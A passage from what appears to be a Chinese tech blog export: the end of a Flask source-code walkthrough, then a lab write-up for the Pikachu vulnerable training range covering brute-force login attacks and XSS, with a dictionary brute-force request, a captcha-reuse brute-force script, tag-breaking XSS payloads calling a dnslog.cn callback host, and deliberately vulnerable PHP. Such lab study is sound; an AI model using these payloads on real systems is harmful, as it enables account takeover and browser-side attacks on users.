response object.    .. versionchanged:: 2.2        A generator will be converted to a streaming response.        A list will be converted to a JSON response.    .. versionchanged:: 1.1        A dict will be converted to a JSON response.    .. versionchanged:: 0.9       Previously a tuple was interpreted as the arguments for the       response object.    &quot;&quot;&quot;    status = headers = None    # unpack tuple returns    if isinstance(rv, tuple):        len_rv = len(rv)        # a 3-tuple is unpacked directly        if len_rv == 3:            rv, status, headers = rv  # type: ignore[misc]        # decide if a 2-tuple has status or headers        elif len_rv == 2:            if isinstance(rv[1], (Headers, dict, tuple, list)):                rv, headers = rv            else:                rv, status = rv  # type: ignore[assignment,misc]        # other sized tuples are not allowed        else:            raise TypeError(                &quot;The view function did not return a valid response tuple.&quot;                &quot; The tuple must have the form (body, status, headers),&quot;                &quot; (body, status), or (body, headers).&quot;            )    # the body must not be None    if rv is None:        raise TypeError(            f&quot;The view function for &#123;request.endpoint!r&#125; did not&quot;            &quot; return a valid response. The function either returned&quot;            &quot; None or ended without a return statement.&quot;        )    # make sure the body is an instance of the response class    if not isinstance(rv, self.response_class):        if isinstance(rv, (str, bytes, bytearray)) or isinstance(rv, cabc.Iterator):            # let the response class set the status and headers instead of            # waiting to do it manually, so that the class can handle any            # special logic            rv = self.response_class(                rv,                status=status,                headers=headers,  # type: ignore[arg-type]            )            status = headers = None        elif isinstance(rv, (dict, list)):            rv = self.json.response(rv)        elif isinstance(rv, BaseResponse) or callable(rv):            # evaluate a WSGI callable, or coerce a different response            # class to the correct type            try:                rv = self.response_class.force_type(                    rv,  # type: ignore[arg-type]                    request.environ,                )            except TypeError as e:                raise TypeError(                    f&quot;&#123;e&#125;\\nThe view function did not return a valid&quot;                    &quot; response. The return type must be a string,&quot;                    &quot; dict, list, tuple with headers or status,&quot;                    &quot; Response instance, or WSGI callable, but it&quot;                    f&quot; was a &#123;type(rv).__name__&#125;.&quot;                ).with_traceback(sys.exc_info()[2]) from None        else:            raise TypeError(                &quot;The view function did not return a valid&quot;                &quot; response. The return type must be a string,&quot;                &quot; dict, list, tuple with headers or status,&quot;                &quot; Response instance, or WSGI callable, but it was a&quot;                f&quot; &#123;type(rv).__name__&#125;.&quot;            )    rv = t.cast(Response, rv)    # prefer the status if it was provided    if status is not None:        if isinstance(status, (str, bytes, bytearray)):            rv.status = status        else:            rv.status_code = status    # extend existing headers with provided headers    if headers:        rv.headers.update(headers)  # type: ignore[arg-type]    return rv\n\nmake_response 方法会根据视图函数的返回值类型进行响应的封装，封装后得到的类型取决于 response_class 成员，默认情况下其为继承了 WerkZeug 的 ResponseBase 类型的 Response 类型。对于接收了视图函数返回值的 rv 变量:\n\n若 rv 为一个元组\nrv 为一个三元组，则直接 unpacking 为 rv , HTTP status , HTTP headers\nrv 为一个二元组\n若二元组的最后一个成员是字典，元组或列表，则将该二元组 unpacking 为 rv 与 HTTP headers\n否则将二元组 unpacking 为 rv 与 HTTP status\n\n\nrv 为其它格式则抛出 TypeError\n\n\n若 rv 为 None ，则抛出 TypeError\n若 rv 不是一个 response_class 实例\nrv 为 str ，byte , bytearray 类型或者是一个迭代器，则将 rv 封装为一个 response_class 实例\nrv 为字典或列表，则将其封装为一个 json.response 实例\nrv 为 WSGI 底层的 BaseResponse 对象实例或为一个函数（应为满足 WSGI 要求的函数），则通过 response_class.force_type 方法强制转换为 response_class 实例\n\n\n\n以上处理逻辑按照顺序执行，最终 rv 会被作为 response_class 实例被返回给 finalize_request 方法\nfinalize_request 方法在获取到 make_response 方法生成的响应对象后，会再通过 process_response 方法对生成的请求通过 Hook 函数再进行响应处理\ndef process_response(self, response: Response) -&gt; Response:    &quot;&quot;&quot;Can be overridden in order to modify the response object    before it&#x27;s sent to the WSGI server.  By default this will    call all the :meth:`after_request` decorated functions.    .. versionchanged:: 0.5       As of Flask 0.5 the functions registered for after request       execution are called in reverse order of registration.    :param response: a :attr:`response_class` object.    :return: a new response object or the same, has to be an             instance of :attr:`response_class`.    &quot;&quot;&quot;    ctx = request_ctx._get_current_object()  # type: ignore[attr-defined]    for func in ctx._after_request_functions:        response = self.ensure_sync(func)(response)    for name in chain(request.blueprints, (None,)):        if name in self.after_request_funcs:            for func in reversed(self.after_request_funcs[name]):                response = self.ensure_sync(func)(response)    if not self.session_interface.is_null_session(ctx.session):        self.session_interface.save_session(self, ctx.session, response)    return response\n\n处理响应的 Hook 函数通过 after_request 方法进行注册。\nprocess_response 方法处理过后的 response 会返回给 finalize_request 方法，发送响应信号后若执行无异常则 finalize_request 方法会向上传递 response 给 full_dispatch_request 方法，wsgi_app 方法，最终通过 WSGI 接口响应给请求方。\n总结Flask Web Server 是这样工作的：\nFlask 通过 WSGI 接口获取到 HTTP 请求，并通过调用 wsgi_app 方法对请求进行处理。wsgi_app 方法创建该请求的上下文，并调用 full_dispatch_request 方法进行进一步的处理。如果该请求为 Flask Web Server 收到的第一个请求 ， full_dispatch_request 会将自己的 _got_first_request 成员设置为 True 以标记已接受过请求(这一成员在 Flask Web Server 启动时被初始化为 False )。在接收到请求后，full_dispatch_request 方法会做三件事\n\n通过 preprocess_request 方法对请求进行预处理\npreprocess_request 方法会执行注册好的 Hook 函数对请求进行预处理，预处理阶段就可能会直接生成响应而非通过视图函数生成响应这一设计是出于业务场景的需求设计的，例如预处理阶段需要对请求方进行鉴权，鉴权不通过便直接响应 403 而非执行相应业务逻辑\nHook 函数通过 before_request 方法或通过蓝图的 app_url_value_preprocessor 方法注册\nHook 函数是顺序执行的，若出现非 None 的 Hook 函数返回值则 preprocess_request 方法会立即返回以将 Hook 函数返回值向上传递\n\n\n通过 dispatch_request 方法进行路由分发\nHook 函数全部执行完毕后没有提前进行返回，即 preprocess_request 方法的返回值为 None 时，Flask 会进入 dispatch_request 方法进行路由分发，从请求中提取出 URL 规则，并根据 URL 的 endpoint 执行对应视图函数，并在视图函数执行完毕后向上传递其返回值\n视图函数通过 route 方法注册\n路由分发时会对路由异常的请求抛出异常以进行处理\n\n\n通过 finalize_request 方法生成响应\n无论响应是由视图函数生成还是由 Hook 函数生成，它们都需要被 make_response 方法封装为 response_class 类型，这一类型默认为 Flask 的 Response 类型\n响应被 make_response 方法封装为 Response 类型后会被 process_response 方法再次进行处理，对响应进行处理的 Hook 函数通过 after_request 方法注册\n\n\n\n经过以上处理流程后，full_dispatch_request 方法将响应传递给 wsgi_app 方法，后者将响应通过 WSGI 接口响应给请求方并销毁该请求的上下文\n尽管我们在讨论中忽略了 Flask 异常处理，上下文管理，路由匹配与信号相关机制的实现，但这并不妨碍我们基本理解 Flask Web Server 的工作流程的大概样貌。在理解了 Flask 是如何通过它的请求响应循环实现 Web Server 的基本功能后，我们将进一步深入 Flask 框架的路由，上下文管理，异常处理与信号等模块的原理与实现\nTipsFlask 中针对其功能实现定义了自己的 Request 类型与 Response 类型，不过并未在 WerkZeug 的 RequestBase 与 ResponseBase 类的基础上做太多修改\nRequest 类class Request(RequestBase):    &quot;&quot;&quot;The request object used by default in Flask.  Remembers the    matched endpoint and view arguments.    It is what ends up as :class:`~flask.request`.  If you want to replace    the request object used you can subclass this and set    :attr:`~flask.Flask.request_class` to your subclass.    The request object is a :class:`~werkzeug.wrappers.Request` subclass and    provides all of the attributes Werkzeug defines plus a few Flask    specific ones.    &quot;&quot;&quot;    json_module: t.Any = json    #: The internal URL rule that matched the request.  This can be    #: useful to inspect which methods are allowed for the URL from    #: a before/after handler (``request.url_rule.methods``) etc.    #: Though if the request&#x27;s method was invalid for the URL rule,    #: the valid list is available in ``routing_exception.valid_methods``    #: instead (an attribute of the Werkzeug exception    #: :exc:`~werkzeug.exceptions.MethodNotAllowed`)    #: because the request was never internally bound.    #:    #: .. versionadded:: 0.6    url_rule: Rule | None = None    #: A dict of view arguments that matched the request.  If an exception    #: happened when matching, this will be ``None``.    view_args: dict[str, t.Any] | None = None    #: If matching the URL failed, this is the exception that will be    #: raised / was raised as part of the request handling.  This is    #: usually a :exc:`~werkzeug.exceptions.NotFound` exception or    #: something similar.    routing_exception: HTTPException | None = None    @property    def max_content_length(self) -&gt; int | None:  # type: ignore[override]        &quot;&quot;&quot;Read-only view of the ``MAX_CONTENT_LENGTH`` config key.&quot;&quot;&quot;        if current_app:            return current_app.config[&quot;MAX_CONTENT_LENGTH&quot;]  # type: ignore[no-any-return]        else:            return None    @property    def endpoint(self) -&gt; str | None:        &quot;&quot;&quot;The endpoint that matched the request URL.        This will be ``None`` if matching failed or has not been        performed yet.        This in combination with :attr:`view_args` can be used to        reconstruct the same URL or a modified URL.        &quot;&quot;&quot;        if self.url_rule is not None:            return self.url_rule.endpoint        return None    @property    def blueprint(self) -&gt; str | None:        &quot;&quot;&quot;The registered name of the current blueprint.        This will be ``None`` if the endpoint is not part of a        blueprint, or if URL matching failed or has not been performed        yet.        This does not necessarily match the name the blueprint was        created with. It may have been nested, or registered with a        different name.        &quot;&quot;&quot;        endpoint = self.endpoint        if endpoint is not None and &quot;.&quot; in endpoint:            return endpoint.rpartition(&quot;.&quot;)[0]        return None    @property    def blueprints(self) -&gt; list[str]:        &quot;&quot;&quot;The registered names of the current blueprint upwards through        parent blueprints.        This will be an empty list if there is no current blueprint, or        if URL matching failed.        .. versionadded:: 2.0.1        &quot;&quot;&quot;        name = self.blueprint        if name is None:            return []        return _split_blueprint_path(name)    def _load_form_data(self) -&gt; None:        super()._load_form_data()        # In debug mode we&#x27;re replacing the files multidict with an ad-hoc        # subclass that raises a different error for key errors.        if (            current_app            and current_app.debug            and self.mimetype != &quot;multipart/form-data&quot;            and not self.files        ):            from .debughelpers import attach_enctype_error_multidict            attach_enctype_error_multidict(self)    def on_json_loading_failed(self, e: ValueError | None) -&gt; t.Any:        try:            return super().on_json_loading_failed(e)        except BadRequest as e:            if current_app and current_app.debug:                raise            raise BadRequest() from e\n\nFlask 的 Request 类在它所继承的 RequestBase 类的基础上通过 @property 装饰器添加了 Flask 框架的蓝图，视图函数 endpoint 等属性，\nResponse 类class Response(ResponseBase):    &quot;&quot;&quot;The response object that is used by default in Flask.  Works like the    response object from Werkzeug but is set to have an HTML mimetype by    default.  Quite often you don&#x27;t have to create this object yourself because    :meth:`~flask.Flask.make_response` will take care of that for you.    If you want to replace the response object used you can subclass this and    set :attr:`~flask.Flask.response_class` to your subclass.    .. versionchanged:: 1.0        JSON support is added to the response, like the request. This is useful        when testing to get the test client response data as JSON.    .. versionchanged:: 1.0        Added :attr:`max_cookie_size`.    &quot;&quot;&quot;    default_mimetype: str | None = &quot;text/html&quot;    json_module = json    autocorrect_location_header = False    @property    def max_cookie_size(self) -&gt; int:  # type: ignore        &quot;&quot;&quot;Read-only view of the :data:`MAX_COOKIE_SIZE` config key.        See :attr:`~werkzeug.wrappers.Response.max_cookie_size` in        Werkzeug&#x27;s docs.        &quot;&quot;&quot;        if current_app:            return current_app.config[&quot;MAX_COOKIE_SIZE&quot;]  # type: ignore[no-any-return]        # return Werkzeug&#x27;s default when not in an app context        return super().max_cookie_size\n\nReferenceFlask RepoFlaskWerkZeug\n","categories":["Tech Blog"]},{"title":"Pikachu 靶场攻关记录","url":"/2023/11/11/Tech%20Blog/Pikachu/","content":"Pikachu是一个面向Web渗透测试学习人员的靶场，其上的漏洞类型列表如下：\n\nBurt Force(暴力破解漏洞)\nXSS(跨站脚本漏洞)\nCSRF(跨站请求伪造)\nSQL-Inject(SQL注入漏洞)\nRCE(远程命令&#x2F;代码执行)\nFiles Inclusion(文件包含漏洞)\nUnsafe file downloads(不安全的文件下载)\nUnsafe file uploads(不安全的文件上传)\nOver Permisson(越权漏洞)\n..&#x2F;..&#x2F;..&#x2F;(目录遍历)\nI can see your ABC(敏感信息泄露)\nPHP反序列化漏洞\nXXE(XML External Entity attack)\n不安全的URL重定向\nSSRF(Server-Side Request Forgery)\nMore…(找找看?..有彩蛋!)\n管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~\n\n每类漏洞根据不同的情况又分别设计了不同的子类\n在对靶场进行渗透测试的过程中，我将靶场上的常见 Web 漏洞的概述中有代表性的部分进行了总结，并记录了自己 Hack 过程中使用的技术手段( payload )与思考(牢骚)。\n\n\nBurt Force (暴力破解漏洞)概述\n从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基\n\n“暴力破解”是一种常见攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。\n\n理论上来说，大多数系统都可以被穷举法这种简单粗暴的手段攻破，这也是暴力破解这一名字的来由，因为真的很暴力，但也真的很有效。判断一个系统是否具有暴力破解漏洞，并不是根据它能否被暴力破解决定，而是由需要多久才能暴力破解决定。如果暴力破解一个系统的过程中待破解的信息已经过了时效性又或者破解这个系统所需要的成本比这个系统所具有的价值高，那么暴力破解就将会是失败的。因此，提高暴力破解的效率是至关紧要的，大部分暴力破解都有着根据某些技术或者线索进一步优化的空间，大有门道可言，从这一角度来说，暴力破解也可以变得十分优雅\n\n攻击者在暴力破解时，所关心的web应用系统所采取的认证安全策略,往往包括但不限于：\n\n是否要求用户设置复杂的密码\n是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp\n是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）\n是否采用了双因素认证\n\n如果一个Web应用系统采用了比较弱的认证安全策略(被暴力破解成功的可能性较高)，那暴力破解漏洞带来的危害一定会远超预期\n基于表单的暴力破解漏洞利用访问该页面可以发现其为表单登陆，没有验证码或其它访问控制措施，直接抓包并上字典爆破即可\n爆破报文 (基于 Yakit )\nPOST /pikachu/vul/burteforce/bf_form.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 43Origin: http://127.0.0.1Connection: keep-aliveReferer: http://127.0.0.1/pikachu/vul/burteforce/bf_form.phpCookie: _ga_RTMV0WQ0E9=GS1.1.1706795665.1.1.1706795700.0.0.0; _ga=GA1.1.1296425997.1706795666; security=impossible; PHPSESSID=du3liq1mv90deoasfj0od4b0moUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1DNT: 1Sec-GPC: 1Pragma: no-cacheCache-Control: no-cacheusername=admin&amp;password=&#123;&#123;payload(2020-200_most_used_passwords)&#125;&#125;&amp;submit=Login\n\n发现 login success\n漏洞代码解读// 纯粹的用户登录业务逻辑，没有任何访问控制措施if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;])&#123;    $username = $_POST[&#x27;username&#x27;];    $password = $_POST[&#x27;password&#x27;];    $sql = &quot;select * from users where username=? and password=md5(?)&quot;;    $line_pre = $link-&gt;prepare($sql);    $line_pre-&gt;bind_param(&#x27;ss&#x27;,$username,$password);    if($line_pre-&gt;execute())&#123;        $line_pre-&gt;store_result();        if($line_pre-&gt;num_rows&gt;0)&#123;            $html.= &#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;;        &#125; else&#123;            $html.= &#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;;        &#125;    &#125; else&#123;        $html.= &#x27;&lt;p&gt;执行错误:&#x27;.$line_pre-&gt;errno.&#x27;错误信息:&#x27;.$line_pre-&gt;error.&#x27;&lt;/p&gt;&#x27;;    &#125;&#125;\n\n验证码绕过On Server漏洞利用每次访问目标页面，Web Server 都会通过 http://127.0.0.1/pikachu/inc/showvcode.php 接口更新用户需要输入的验证码。但由于验证码的更新需要通过触发这个接口才会进行，因此直接通过登陆接口 http://127.0.0.1/pikachu/vul/burteforce/bf_server.php 进行登陆则验证码不会更新，故可复用验证码进行爆破\n爆破脚本如下\nfrom http import HTTPStatusimport httpxdef guess_passwd() -&gt; str:    &quot;get your passwd dictionary&quot;    return str()def guess_username() -&gt; str:    &quot;get your username dictionary&quot;    return str()URL = &quot;http://localhost/pikachu/vul/burteforce/bf_server.php&quot;php_cookie = &quot;du3liq1mv90deoasfj0od4b0mo&quot; #examplecookie: dict[str, str] = &#123;        &quot;PHPSESSID&quot;: php_cookie,&#125;user_name: str = guess_username()passwd: str = guess_passwd()data = &#123;    &quot;username&quot;:user_name,     &quot;password&quot;:passwd,    &quot;vcode&quot;:&quot;xnc8bk&quot;,    &quot;submit&quot;:&quot;Login&quot;&#125;resp = httpx.post(URL,data=data,cookies=cookie)if resp.status_code == HTTPStatus.OK and &quot;login success&quot; in resp.text:    print(&quot;Success&quot;)\n\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;])) &#123;    if (empty($_POST[&#x27;username&#x27;])) &#123;        $html .= &quot;&lt;p class=&#x27;notice&#x27;&gt;用户名不能为空&lt;/p&gt;&quot;;    &#125; else &#123;        if (empty($_POST[&#x27;password&#x27;])) &#123;            $html .= &quot;&lt;p class=&#x27;notice&#x27;&gt;密码不能为空&lt;/p&gt;&quot;;        &#125; else &#123;            if (empty($_POST[&#x27;vcode&#x27;])) &#123;                $html .= &quot;&lt;p class=&#x27;notice&#x27;&gt;验证码不能为空哦！&lt;/p&gt;&quot;;            &#125; else &#123;//              验证验证码是否正确                if (strtolower($_POST[&#x27;vcode&#x27;]) != strtolower($_SESSION[&#x27;vcode&#x27;])) &#123;                    $html .= &quot;&lt;p class=&#x27;notice&#x27;&gt;验证码输入错误哦！&lt;/p&gt;&quot;;                    //应该在验证完成后,销毁该$_SESSION[&#x27;vcode&#x27;]                &#125;else&#123;                    $username = $_POST[&#x27;username&#x27;];                    $password = $_POST[&#x27;password&#x27;];                    $vcode = $_POST[&#x27;vcode&#x27;];                    $sql = &quot;select * from users where username=? and password=md5(?)&quot;;                    $line_pre = $link-&gt;prepare($sql);                    $line_pre-&gt;bind_param(&#x27;ss&#x27;,$username,$password);                    if($line_pre-&gt;execute())&#123;                        $line_pre-&gt;store_result();                        //虽然前面做了为空判断,但最后,却没有验证验证码!!!                        if($line_pre-&gt;num_rows()==1)&#123;                            $html.=&#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;;                        &#125;else&#123;                            $html.= &#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;;                        &#125;                    &#125;else&#123;                        $html.= &#x27;&lt;p&gt;执行错误:&#x27;.$line_pre-&gt;errno.&#x27;错误信息:&#x27;.$line_pre-&gt;error.&#x27;&lt;/p&gt;&#x27;;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;\n\nOn Client漏洞利用验证码是由前端生成并检验的，禁用 JS 即可\n漏洞代码解读Server\nif(isset($_POST[&#x27;submit&#x27;]))&#123;    if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123;        $username = $_POST[&#x27;username&#x27;];        $password = $_POST[&#x27;password&#x27;];        $sql = &quot;select * from users where username=? and password=md5(?)&quot;;        $line_pre = $link-&gt;prepare($sql);        $line_pre-&gt;bind_param(&#x27;ss&#x27;, $username, $password);        if ($line_pre-&gt;execute()) &#123;            $line_pre-&gt;store_result();            if ($line_pre-&gt;num_rows &gt; 0) &#123;                $html .= &#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;;            &#125; else &#123;                $html .= &#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;;            &#125;        &#125; else &#123;            $html .= &#x27;&lt;p&gt;执行错误:&#x27; . $line_pre-&gt;errno . &#x27;错误信息:&#x27; . $line_pre-&gt;error . &#x27;&lt;/p&gt;&#x27;;        &#125;    &#125;else&#123;        $html .= &#x27;&lt;p&gt; please input username and password～&lt;/p&gt;&#x27;;    &#125;&#125;\n\nClient\nvar code; //在全局 定义验证码function createCode() &#123;    code = &quot;&quot;;    var codeLength = 5;//验证码的长度    var checkCode = document.getElementById(&quot;checkCode&quot;);    var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;Z&#x27;);//所有候选组成验证码的字符，当然也可以用中文的    for (var i = 0; i &lt; codeLength; i++) &#123;        var charIndex = Math.floor(Math.random() * 36);        code += selectChar[charIndex];    &#125;    //alert(code);    if (checkCode) &#123;        checkCode.className = &quot;code&quot;;        checkCode.value = code;    &#125;&#125;function validate() &#123;    var inputCode = document.querySelector(&#x27;#bf_client .vcode&#x27;).value;    if (inputCode.length &lt;= 0) &#123;        alert(&quot;请输入验证码！&quot;);        return false;    &#125; else if (inputCode != code) &#123;        alert(&quot;验证码输入错误！&quot;);        createCode();//刷新验证码        return false;    &#125;    else &#123;        return true;    &#125;&#125;createCode();\n\ntoken防爆破漏洞利用查看源代码会发现每次进行登陆，服务器都会检验 Token 是否正确，并刷新 Token 。若无 Token 刷新操作则完全可以像之前复用验证码那样复用 Token ，但由于 Token 每次都会刷新，单纯的通过复用进行绕过无法达到暴力破解的目的。但由于该登陆业务只使用了 Token 进行访问控制，因此攻击者仍可以采用一定的技术手段进行暴力破解，例如\n\n使用 Python 脚本捕获每一次响应返回的 Token 值将 Token 值填入到下一次请求的请求头中进行爆破\n使用 Burp Suite 的 Pitchfork 模式通过 Recursive grep 进行爆破\n使用 Yakit 的草叉模式和数据提取器进行爆破\n\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;] &amp;&amp; $_POST[&#x27;token&#x27;])&#123;    $username = $_POST[&#x27;username&#x27;];    $password = $_POST[&#x27;password&#x27;];    $token = $_POST[&#x27;token&#x27;];    $sql = &quot;select * from users where username=? and password=md5(?)&quot;;    $line_pre = $link-&gt;prepare($sql);    $line_pre-&gt;bind_param(&#x27;ss&#x27;,$username,$password);    if($token == $_SESSION[&#x27;token&#x27;])&#123;        if($line_pre-&gt;execute())&#123;            $line_pre-&gt;store_result();            if($line_pre-&gt;num_rows&gt;0)&#123;                $html.= &#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;;            &#125; else&#123;                $html.= &#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;;            &#125;        &#125;else&#123;            $html.= &#x27;&lt;p&gt;执行错误:&#x27;.$line_pre-&gt;errno.&#x27;错误信息:&#x27;.$line_pre-&gt;error.&#x27;&lt;/p&gt;&#x27;;        &#125;    &#125;else&#123;        $html.= &#x27;&lt;p&gt; csrf token error&lt;/p&gt;&#x27;;    &#125;&#125;//生成tokenset_token();\n\nXSS (跨站脚本漏洞)概述Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表( Cascading Style Sheets )的缩写”CSS”冲突，故又称 XSS 。一般 XSS 可以分为如下几种常见类型：\n\n反射性 XSS\n存储型 XSS\nDOM 型 XSS\n\nXSS 漏洞在 OWASP TOP10 的排名中常年位居前三，很容易造成较大的危害。它是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。\n形成XSS漏洞的主要原因是程序对输入和输出没有做充分的处理，导致被攻击者精心构造的恶意字符串输出在前端时被浏览器当作有效代码解析执行从而产生危害。\n在XSS漏洞的防范上，一般会采用\n\n输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;\n输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n\n的方式进行处理\n反射型 XSS(get)漏洞利用直接输入 html 代码，发现输入的 html 代码会被直接解析并回显到前端，故该输入处为输出点。尝试添加 JavaScript 代码，发现存在输入字符的长度限制。但该限制也是由前端实现的，直接审查元素修改或忽视即可\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]))&#123;    if(empty($_GET[&#x27;message&#x27;]))&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;输入&#x27;kobe&#x27;试试-_-&lt;/p&gt;&quot;;    &#125;else&#123;        if($_GET[&#x27;message&#x27;]==&#x27;kobe&#x27;)&#123;            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;愿你和&#123;$_GET[&#x27;message&#x27;]&#125;一样，永远年轻，永远热血沸腾！&lt;/p&gt;&lt;img src=&#x27;&#123;$PIKA_ROOT_DIR&#125;assets/images/nbaplayer/kobe.png&#x27; /&gt;&quot;;        &#125;else&#123;            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;who is &#123;$_GET[&#x27;message&#x27;]&#125;,i don&#x27;t care!&lt;/p&gt;&quot;;        &#125;    &#125;&#125;\n\n反射型 XSS(post)漏洞利用与 get 型一样\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]))&#123;    if(empty($_POST[&#x27;message&#x27;]))&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;输入&#x27;kobe&#x27;试试-_-&lt;/p&gt;&quot;;    &#125;else&#123;        //下面直接将前端输入的参数原封不动的输出了,出现xss        if($_POST[&#x27;message&#x27;]==&#x27;kobe&#x27;)&#123;            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;愿你和&#123;$_POST[&#x27;message&#x27;]&#125;一样，永远年轻，永远热血沸腾！&lt;/p&gt;&lt;img src=&#x27;&#123;$PIKA_ROOT_DIR&#125;assets/images/nbaplayer/kobe.png&#x27; /&gt;&quot;;        &#125;else&#123;            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;who is &#123;$_POST[&#x27;message&#x27;]&#125;,i don&#x27;t care!&lt;/p&gt;&quot;;        &#125;    &#125;&#125;\n\n存储型 XSS漏洞利用与反射型 XSS 相同，只是被插入的恶意代码会被存储到后端数据库中，并持续性地造成攻击\n漏洞代码解读if(array_key_exists(&quot;message&quot;,$_POST) &amp;&amp; $_POST[&#x27;message&#x27;]!=null)&#123;    $message=escape($link, $_POST[&#x27;message&#x27;]);    $query=&quot;insert into message(content,time) values(&#x27;$message&#x27;,now())&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)!=1)&#123;        $html.=&quot;&lt;p&gt;数据库出现异常，提交失败！&lt;/p&gt;&quot;;    &#125;&#125;if(array_key_exists(&#x27;id&#x27;, $_GET) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;    //彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入    $query=&quot;delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)==1)&#123;        echo &quot;&lt;script type=&#x27;text/javascript&#x27;&gt;document.location.href=&#x27;xss_stored.php&#x27;&lt;/script&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p id=&#x27;op_notice&#x27;&gt;删除失败,请重试并检查数据库是否还好!&lt;/p&gt;&quot;;    &#125;&#125;\n\nDOM 型 XSS漏洞利用输入 xsstest 进行 Fuzz 测试，通过审查元素搜索 xsstest 发现该 payload 被插入成了 a 标签的 href 属性值，尝试构造 payload 闭合该标签\n&#x27;&gt;&lt;/a&gt;&lt;img src=&quot;https://kblauh.dnslog.cn&quot;&gt;&lt;a href=&quot;\n\n对应注入点变为\n&lt;div id=&quot;dom&quot;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;img src=&quot;https://kblauh.dnslog.cn&quot;&gt;&lt;/div&gt;\n\n查看 DNSLOG 发现攻击成功\n漏洞代码解读&lt;div id=&quot;xssd_main&quot;&gt;    &lt;script&gt;        function domxss()&#123;            var str = document.getElementById(&quot;text&quot;).value;            document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;;        &#125;        //试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;        //试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行    &lt;/script&gt;    &lt;!--&lt;a href=&quot;&quot; onclick=(&#x27;xss&#x27;)&gt;--&gt;    &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;    &lt;input id=&quot;button&quot; type=&quot;button&quot; value=&quot;click me!&quot; onclick=&quot;domxss()&quot; /&gt;       &lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;&lt;/div&gt;\n\nDOM 型 XSS-X漏洞利用与前一 DOM 型 XSS 相同，只是获取参数的方式变成了从 URL 的 GET 参数中获取\n漏洞代码解读&lt;div id=&quot;xssd_main&quot;&gt;    &lt;script&gt;        function domxss()&#123;            var str = window.location.search;            var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);            var xss = txss.replace(/\\+/g,&#x27; &#x27;);            //                        alert(xss);            document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+xss+&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;;        &#125;        //试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;        //试试：&#x27; 